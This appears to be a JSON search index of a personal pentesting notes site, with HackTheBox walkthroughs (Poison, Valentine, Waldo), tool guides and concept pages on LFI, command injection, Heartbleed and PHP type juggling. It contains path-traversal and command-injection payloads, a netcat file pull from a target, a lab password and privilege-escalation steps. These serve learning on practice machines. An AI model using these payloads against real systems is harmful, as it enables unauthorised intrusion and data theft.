[
{
	"uri": "/hackthebox/boxes/",
	"title": "Boxes",
	"tags": [],
	"description": "",
	"content": "Boxes\n```  Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\n  Valentine I lost my original notes. VM corrupted. PHASE 1 — NMAP nmap -sC -sV -Pn -oA initial 10.10.10.79 Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out. PHASE 2 — GOBUSTER /wpscan gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50 return vulnerable to OpenSSL hearbleed PHASE 3 Manual investigation of the webpage\n  Waldo WALDO Instead of giving binaries system-wide permissions, give them the permissions they need to do the job. Skipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work. Sqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output.\n  ```\n"
},
{
	"uri": "/github/hugo/install/",
	"title": "",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/github/hugo/staticwebpages/",
	"title": "",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hackthebox/challenges/bloodhound/",
	"title": "",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "PLEASE CONTACT ME ON TWITTER OR BY EMAIL AT CHICKENPWNY IF ANY OF THE CONTENT VIOLATES HACKTHEBOX EULA.\nWelcome, to my repository of knowledge, HACKTHEBOXon walkthroughs, pentesting tools \u0026amp; concepts. The top right you will find social links. to the left or top, you should see navigation depends on the platform.\n"
},
{
	"uri": "/concepts/webapppentest/lfi/",
	"title": " Local File inclusion",
	"tags": [],
	"description": "",
	"content": "Local file inclusion is pretty rare as it requires bad coding but it does happen. This vulnerability occurs when system commands or unsanitized user input or written into how the web server handles user input. Basically, you escape out of the current string and your commands get executed. This only grants you the access the web app has. So if the PHP script has permissions for www-data which is a web server user. You won\u0026rsquo;t be able to access anything with elevated permissions. Before you start thinking PHP is the bad guy I want to go ahead and say all of the webpage languages are vulnerable.\nWord list for lfi can be found in seclist: /Seclist/Fuzzing/LFI-JHADDIX.txt\n\u0026hellip;.//\u0026hellip;.//\u0026hellip;.//etc/passwd\n/../../etc/passwd\n/..../..../..../..../..../..../etc/passwd\n/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/etc/passwd\n\\…..\\\\…..\\\\…..\\\\etc\\passwd\n Often there will be filters in place, and then the job becomes understanding how the information is being filtered. If you\u0026rsquo;d like to see how PHP script in waldo handled user input read the WALDO write-up. You can also use burp to test for LFI I would recommend it makes it really convenient to test. in POISON there weren\u0026rsquo;t any filters in place so the standard escaped worked. (examples later) The web form allowed you to read local files. RCE :\nSadly LFI can\u0026rsquo;t upload files so if you want to get a reverse shell you will need the ability to upload binaries. FTP, Upload forums, you can execute the file by going to uploaded binary to execute it to get access.\n "
},
{
	"uri": "/tools/bloodhound/",
	"title": "BloodHound Neo4j",
	"tags": [],
	"description": "setting up bloodhound in a Debian environment",
	"content": "TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.\nI would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.\n##### echo \u0026quot;deb http://httpredir.debian.org/debian jessie-backports main\u0026quot; | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list apt-get update ##### apt-get -t jessie-backports install ca-certificates-java ##### take the output and put it after set \u0026lt;java8bane\u0026gt; update-java-alternatives --list ##### currently update-java-alternatives --jre --set \u0026lt;java8name\u0026gt; ##### update repo wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add - echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee -a /etc/apt/sources.list.d/neo4j.list sudo apt-get update ###### neo4j start -- background neo4j console -- foreground  BloodHound\ngo to the desirded location you wish to set this up. For me a have a tool directory. ##### this is already compiled ready to go git clone https://github.com/BloodHoundAD/BloodHound.git cd BloodHound wget https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-linux-x64.zip unzip BloodHound-linux-x64.zip ./Bloodhound if you get a white screen hit these keys ( crtl + r ) #### For a lager selection of compiled bloodhound releases. https://github.com/BloodHoundAD/BloodHound/releases  I changed the password before I got to this part. So I will be using screenshots from ippsecs video. when you first setup bloodhound and enter some creds it\u0026rsquo;ll ask you to go to localhost:7687 to change the password. go to your browser and type it in. the default creds for neo4j are neo4j and it won\u0026rsquo;t let you in until you change the password which is nice a feature.\nbloodhound login\ninitial neo4j browser page\nchange your password\nIf you\u0026rsquo;d like to install from the repo use this guide\nhttps://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ references and thanks https://www.youtube.com/watch?v=ob9SgtFm6_g\u0026amp;t=21s https://neo4j.com/docs/operations-manual/current/installation/linux/debian/ https://0xdf.gitlab.io/2018/11/10/htb-reel.html  "
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/_header/",
	"title": "ChickenPwny",
	"tags": [],
	"description": "",
	"content": " ChickenPwny "
},
{
	"uri": "/concepts/",
	"title": "Concept",
	"tags": [],
	"description": "",
	"content": "Concept\n WebAppPenTests \n  "
},
{
	"uri": "/github/hugo/",
	"title": "Creating a GitHub Webpage",
	"tags": [],
	"description": "",
	"content": " POWERSHELL  Overview, how to install it, Hugo, and how to set up the web pages using GitHub in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.\nFirst off id like to say I wish there was a way to do this with less command line. I initially tried setting it up on GITLAB but I just couldn\u0026rsquo;t find the material I need to do within windows.\nSetting up GitHub Create two repositories the first will be named YourSite(blog whatever you want). the second must be named the desired url I.E chickenpwny.github.io / YourSite.github.io\ngit clone https://github.com/YourSite.git\nInstalling GoLang in windows Windows GoLang  AFTER INSTALLING GOLANG need to setup Hogo the Content Management System CMS. To do this we will need a windows package manger I chose chocolaty.org\nIF IT HANGS JUST WAIT PANIENTLY FOR ATLEAST ONE MINUTE. mkdir c:\\Hugo\\bin Invoke-webRequest -Uri https://github.com/gohugoio/hugo/releases/download/v0.52/hugo_extended_0.52_Windows-64bit.zip -OutFile hugo_extended_0.52_Windows-64bit.zip cd c:\\Hugo mkdir .\\sites cd .\\sites Now download \u0026amp; install scoop IEX(new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install hugo hugo new site YourSite cd .\\yourSite cd .\\themes git submodule add https://github.com/vjeantet/hugo-theme-docdock.git themes\\hugo-theme-docdock Now we need to set some permission for the repository. If you skip this you may get errors uploading to the repo. submodule add https://github.com/YourSiteCHANGEME/YourSiteCHANGEME.github.io.git public \u0026ndash;  Note, the period before the backslash represents current directory same as in Linux.\nCovering some commands Before we move on from here\nCreate some new content: hugo new content\\first-post.md  To host your webpage locally : hugo server -D localhost  In the content directory adding the _index.md to a folder will make it a page on the site. You can add conent in the _index.md or just use it to name the directory. A little confusing just play around.\nLets say your done editing your content and you want\nYou can use type Hugo to generate your site you must be in the root directory of YourSite. I\u0026rsquo;d recommend using the -t switch for theme. You dont need to supply the full path.\n hugo -t YourThemeName cd public git add . git commit -m \u0026quot;a\u0026quot; git push origin master  "
},
{
	"uri": "/tools/ftp/",
	"title": "FTP",
	"tags": [],
	"description": "",
	"content": "File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I\u0026rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.\nmget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS \u0026amp; SFTP\nSSHFS is built on SFTP. SFTP use’s the SSH protocol for added security to FTP. SSHFS allows you to mount to the file system. This gives you more options when interacting with the host. If SSH is available on the host you can use SFTP or SSHFS.\napt-get install sshfs -y sshfs -p 2222 user@ip_address: /mnt/nightmare/ find . -ls 2\u0026gt;/dev/null \u0026gt; ~/out/put/directory.txt \u0026lt;-- takes forever grep file.txt ~/out/put/directory.txt  "
},
{
	"uri": "/github/",
	"title": "GitHub",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/webapp/gobuster/",
	"title": "GoBuster",
	"tags": [],
	"description": "",
	"content": " Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb \u0026amp; dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.\nEnumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100\n-t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on.\n-s \u0026ldquo;200,204,301,302,307,404\u0026rdquo; errors to look for you can edit these\n-w medium or small\n-x extensions Linux php html txt doc Windows aspx asp php\n-fw force wild card\nAdding SessionID this can be easily overlooked.\n-c PHPSESSIONID=1324567890\nEnumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE). Some webservers can be configred to only accept a certain browser.\ngobuster -u http://target:port -a \u0026lsquo;agent\u0026rsquo; -w wordlists -t 100\nAdding multple extentions\n-x php,aspx,asp,html,doc,txt\n"
},
{
	"uri": "/hackthebox/",
	"title": "HackTheBox",
	"tags": [],
	"description": "",
	"content": "HackTheBox\n Boxes Boxes ``` Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.\n  Miscellaneous Setting up Test Enviroment or Complicated tools.   "
},
{
	"uri": "/concepts/webapppentest/heartbld/",
	"title": "HeartBleed",
	"tags": [],
	"description": "",
	"content": "Heart bleed is an OpenSSL vulnerability that allows the attacker to �bleed� out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time. Messing around with the POC was tricky the c code has all these errors and won�t compile arg, luckily for me, Metasploit has the solution.\nProff of concept https://www.exploit-db.com/exploits/32745/\nMetasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed\n"
},
{
	"uri": "/hackthebox/challenges/",
	"title": "Miscellaneous",
	"tags": [],
	"description": "",
	"content": "Setting up Test Enviroment or Complicated tools.\n  \n  "
},
{
	"uri": "/tools/portscanning/netcat/",
	"title": "NetCat PORT SCAN",
	"tags": [],
	"description": "",
	"content": "NetCat as a port scanner with a little bash foo. We can make bash script that will enumerate ports on a target. NetCat is common on Linux systems. So chances are high it will be available.\nfor ip in $(seq 1 1000); do nc -zv -w 1 10.0.0.2 $ip 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done   "
},
{
	"uri": "/tools/portscanning/nmap/",
	"title": "Nmap",
	"tags": [],
	"description": "",
	"content": "Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.\nnmap -sC -sV -Pn -p- -oA total-nightmare -T3 10.10.10.6\nnmap -sT -vv -oA total-nightmare -T3 10.10.10.6 TCP CONNECT nmap -sU -p- -oA total-UDP-nightmare -T3 10.10.10.6 UDP SCAN -sC: equivalent to \u0026ndash;script=default\n-sV: Probe open ports to determine service/version info\n-Pn: Treat all hosts as online \u0026ndash; skip host discovery ​ nmap -v -iR 10000 -Pn -p 80\n-p port ranges : Only scan specified ports ​ Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 \u0026ndash;exclude-ports port ranges : Exclude the specified ports from scanning\n-p- Scan 1 to 65000 ports\n-T1 1 through 5 it\u0026rsquo;s not recommended to run 5\nExample Nmap 7.70 scan initiated Sun Dec 2 14:12:17 2018 as: nmap -sC -sV -Pn -p- -oA total-nightmare -T5 10.10.10.6` `Nmap scan report for 10.10.10.66` `Host is up (0.14s latency).` `Not shown: 65533 filtered ports` \u0026lt;div class=\u0026quot;notices note\u0026quot; \u0026gt;\u0026lt;p\u0026gt;\u0026lt;code\u0026gt;PORT STATE SERVICE VERSION\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| http-cookie-flags:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| /:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| PHPSESSID:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ httponly flag not set\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: NOTES\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;2222/tcp open ssh (protocol 2.0)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| fingerprint-strings:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| NULL:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ SSH-2.0-OpenSSH 32bit (not so recent ver)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| ssh-hostkey:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 256 bf:e8:25:bf:ca:92:55:bc:ca:a4:96:c7:43:d0:51:73 (ECDSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ 256 6f:14:30:b1:39:47:54:b7:5a:01:be:96:2c:a7:96:58 (ED25519)\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; `1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :` `SF-Port2222-TCP:V=7.70%I=7%D=12/2%Time=5C042F3B%P=x86_64-pc-linux-gnu%r(NU` `SF:LL,2B,\u0026quot;SSH-2\\.0-OpenSSH\\x2032bit\\x20\\(not\\x20so\\x20recent\\x20ver\\)\\r\\n\u0026quot;` `SF:);` `Service detection performed. Please report any incorrect results at https://nmap.org/submit/`   "
},
{
	"uri": "/concepts/webapppentest/osinjcmd/",
	"title": "OS Command Injection",
	"tags": [],
	"description": "",
	"content": "No, probably not what your thinking. I’m talking about web app pen-testing. A lot of programming languages are vulnerable, to command injection via webpage. The user supplies OS commands that are escaped and executed. This is due to not properly sanitizing user input or elements aren’t hard coded allowing for exploitation. Below are the characters to sanitize.\n| \u0026amp;\u0026amp; … ; `(tilda) \u0026gt; \u0026lt; \\ !  This vulnerability can occur by using as owsp puts it Dangerous API, or using system commands inside a script that handles users supplied input.\nPHP system exec eval shell_exec ASP.NET HttpRequest.Params HttpRequest.Url HttpRequest.Item EXAMPLES hackthebox.eu/index.php?exec=ls index.php?shell_exec=c3ViMmlw;ls index.php?shell_exec=c3ViMmlw||ls POST request tester=c3ViMmlw|ls tester=c3ViMmlw||ls tester=c3ViMmlw;ls tester2=c3ViMmlw\u0026amp;\u0026amp;ls \u0026lt; -- in some scenario you'll need to encode theses values  FOR MORE INFORMATION PLEASE FOLLOW THESES LINKS\nhttps://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/\nTesting for Command Injection (OTG-INPVAL-013) - OWASP *OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user…*www.owasp.org\nhttps://www.owasp.org/index.php/Command_Injection\n"
},
{
	"uri": "/concepts/webapppentest/phptypejuggling/",
	"title": "PHP Typw Juggling",
	"tags": [],
	"description": "",
	"content": "PHP Type Juggling\nThis article will cover PHP type juggling, and some different ways i have encountered it on hackthebox .\nPHP has two comparisons; loose (==, =!) and strict (=\\==). Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used. This is a built in feature for PHP to force type conversion into specific data type.\nPHP loose comparison does this to accommodate different data types for example; ‘9’ is different from 9. Adding the two data types in PHP will result in 18. In other languages like python will not accommodate such errors. PHP does this so the program might run as it was expected to. Accommodating human errors. Below are some examples of loose comparison.\n'0e1234' == '0e4321' '0e1234' == '0' '0e1234' \u0026lt;= '1' '0xf' == '15' #0xf in hexadecimal notation is 15  when php compares a string to a interger it has some weird quirks.\n'000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)  Another example is when PHP try’s to interpreter a string and its converted into PHP exponential notation 0e⁰²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ 0e²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ equates to int(0) as well. If the number after the first letter is 0 it will remove the leading zero.\nIn the above examples the entire string is converted into a numerical value, or something completely different. Confusing I know but here are some popular charts that show how loose comparison works.\nThe Encounters\nphpsession, cookies, \u0026amp; passwords are susceptible to PHP type juggling. Allowing the attacker to take advantage of a PHP feature to gain access to valid user accounts. From what I have read, the attacker randomly generates cookies. Trying to predict the next cookie. The more random(entropy) the targets cookies have, the harder it is to preform this attack.\nIn the below example, PHP will convert both of the md5 hashes into integers. It will then compare the two values based on the integer. Even though the two hash are different they are both treated as value.\nsubmited cookie aa6fw…34tj4343 = 0 stored cookie ff6dj..w221.5885m = 0  This is also applicable to PHP authentication\nstored password e0rj238r submited password e0mfwewl  References:\nhttps://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ https://www.whitehatsec.com/blog/magic-hashes/  "
},
{
	"uri": "/hackthebox/boxes/poison/",
	"title": "Poison",
	"tags": [],
	"description": "",
	"content": "PHASE 1 NMAP\nnmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.\nport 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32\nport 514 hmm\nPHASE 2 LFI\nManually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\nnext step you will have to decode this secure password.txt. I’d like to note that md5(TMOBILE …COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool — https://gchq.github.io/CyberChef/\nCharix!2#4%6\u0026amp;8(0\nPHASE 3 SSH :🤣\nThis time it wasn’t a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It’s not poison, after a while, I got it right charix is the username.\nsecret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn’t available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS\npython3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.\nFile transfer for NetCat this tool will transfer a file to the other session the \u0026gt; overwrites the file your nc -l -p 8081 \u0026gt; directory_path fromt target nc 10.10.14.3 8081 \u0026gt; secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!\nnetstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN\nYeah, didn’t know this before this box but you can ssh into localhost.\nSSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that’s what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!\n-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you’re smashed into, send it from that host to IP:PORT2\nconcept\nthe juice. it’s a secret guess\nPHASE 5 FINALE\nport 5801 is associated with Vncviewer.\n"
},
{
	"uri": "/tools/portscanning/",
	"title": "PortScannings",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/ssh/sshtunnling/",
	"title": "SSHuttle",
	"tags": [],
	"description": "",
	"content": " Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target\u0026rsquo;s network. It has a lot of options/switches to use but by default, they are set to auto/detect. So typically you won\u0026rsquo;t need most of them.\nDOWNLOAD  Something to note you will need root access to run sshuttle; be sure to test the connection before wildly connecting.\nConnecting to a router with enabled ssh will give you access to the whole network. That is typical of VPN anyways.\nsshuttle -r chicken@192.168.1.6 172.16.42.0/24\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;-r --remote\u0026lt;/code\u0026gt;   "
},
{
	"uri": "/tools/webapp/sqlmap/sqlmap/",
	"title": "SqlMap",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/",
	"title": "Tools",
	"tags": [],
	"description": "",
	"content": "Tools\n"
},
{
	"uri": "/hackthebox/boxes/valentine/",
	"title": "Valentine",
	"tags": [],
	"description": "",
	"content": "I lost my original notes. VM corrupted.\nPHASE 1 — NMAP\nnmap -sC -sV -Pn -oA initial 10.10.10.79\nDidn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out.\nPHASE 2 — GOBUSTER /wpscan\ngobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50\nreturn vulnerable to OpenSSL hearbleed\nPHASE 3 Manual investigation of the webpage\nThe big give away. A heart bleeding, hmm.\nBELIEVE THE HYPE. It’s also a hint to the exploit.\nPHASE 4\nWpscan returned Heartbleed vulnerability.\nYou may also run the exploit through Metasploit.\nBuahahahahaha, we have the ssh RSA key. Truly we are master of the universe.\nwithout Metasploit\nSome crap, the server leaked.\nPHASE 6 SSH\nI wasn’t sure what the username was it took a few tries to figure out its hype :P.\n"
},
{
	"uri": "/tools/webapp/wfuzz/",
	"title": "WFUZZ",
	"tags": [],
	"description": "",
	"content": "WFUZZ\nWFUZZ is a powerful fuzzer, you can enumerate directories, Wierd directories. You can also use it for bruteforcing passwords, look for Lfi, I could keep going. This is a swiss army knife it doesn\u0026rsquo;t beat manual enumeration. Becoming depending on this tool to look for SQL injection can lead you to miss something obvious.\n"
},
{
	"uri": "/hackthebox/boxes/waldo/",
	"title": "Waldo",
	"tags": [],
	"description": "",
	"content": "WALDO\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\nSkipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work.\nSqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output. Nothing I tried allowed me to escape the current directory. Examining what’s available the PHP source code that’s running the website. The PHP script appears to call a bunch of functions from the PHP library =D. REQUEST_METHOD determines whether the request was a post or a get === strict comparison to POST request. the first few parts of the stript involve telling the browser what kind of data to expect Content-Type. “str_replace — Replace all occurrences of the search string with the replacement string” str_replace takes every occurrence of the the subject and replaces those values with replace. Mixed str_replace ( mixed $search , mixed\nIt finds ../ or ..\\” it will replace them with nothing the two quotes in replace represent nothing. the next part say if file name === (strict) user.txt print false(no user.txt) . /n/t/t, /n newline /tab /tab json_encode($filecontent) is taking the var file content and encoding the output(that will matter later) taking all this into consideration the script only checks for ../ or ..\\ anything else it find’s, it’ll ignore. I tried encoding these in every possible way. Then I was reading about LFI and saw it ….// yes the holy grail. ….//….//….// escaped out and allowed for directory traversal.\nI didn’t see .ssh at first because I’ve seen it before. when trying to view .ssh with fileRead it spat out is a directory noticed the output with request differs from .ash_history. bash_history produces false .ssh produced a file. Plug that into fileRead. Then you should find ssh private key!!! the format all fudged. using vim repeat I was able to clean up the file. when editing the file \\n is not a null character, it means newline in JSON. need to also get rid of “\\” this part was also tricky because of these two ports 9000 8888 rabbit holes. Netstat -antp after looking at it for a while noticed some of the ssh connection came from local address rcf-1904 address from localhost weird. That was the next big hint. Since the .monitor file is local now it’ll make it easier to use. the next username is monitor. Next were cast into a restricted environment (jail) to get out of this use the -t switch in ssh -t (bash — noprofile). Lots of rabbit holes \u0026amp; some useless tools.\nssh monitor@waldo -i .monitor -t \u0026quot;bash --noprofile\u0026quot;  PERMISSIONS\n-rwSr--r-- 1 root root first s is the suid bit the capital S denotes the file isn't executable. -rwsr-sr-x 1 root root first s is the suid bit second is the guid bit sticky bit the file gets its permissions from the parent directory  The for mentioned permissions are system-wide can have unintended effects that can often lead to getting root access in one way or another. If the binaries only need to read files with root permissions. Theirs this thing called capabilities. where the file is given limited permission as root. There is a whole a lot of different ones to choose from the one we’re interested in is.\n/usr/bin/tac = cap_dac_read_search  Allows the binary to read files as root. It took a while to find the tools full path getcap basically the find command for Linux capabilities.\n/sbin/getcap -r / 2\u0026gt;/dev/null. If you don’t run it with dev/null it’ll kind of lead you to the .monitor script but we want tac. tac just cat but in reverse lol. cat /root/root.txt  Conclusion\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\n"
},
{
	"uri": "/concepts/webapppentest/",
	"title": "WebAppPenTests",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/webapp/",
	"title": "WebApps",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tools/ssh/",
	"title": "ssh",
	"tags": [],
	"description": "",
	"content": "SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE\u0026rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.\nSSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.\nStart Service\nvi /etc/ssh/sshd_conf PermitRootLogin yes service ssh start\u0026lt;/c\n"
}]